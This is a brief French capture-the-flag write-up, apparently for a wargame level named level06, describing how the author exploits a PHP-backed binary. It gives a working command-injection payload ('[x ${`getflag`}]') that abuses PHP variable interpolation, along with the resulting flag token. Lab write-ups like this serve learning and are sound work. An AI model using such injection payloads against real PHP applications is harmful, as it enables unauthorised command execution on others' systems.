ls -la
un exec trouver level06
et un fichier level06.php

quand on lance l'ex il nous demande un file name
et donc quand on le lance sur le .php il le print avec de y / ... a la place de certaint charac
je vais regarder ca mais on doit pouvoir lui dire de getflag en jouant sur les charac

je vais donc faire des test dans un fichier /tmp/script
avec des echo '[x &...]'
je suis tomber assez rapidement sur la reponse qui est
echo '[x ${`getflag`}]' > /tmp/script

quand je lance ./level06 /tmp/script
ca me donne:
PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub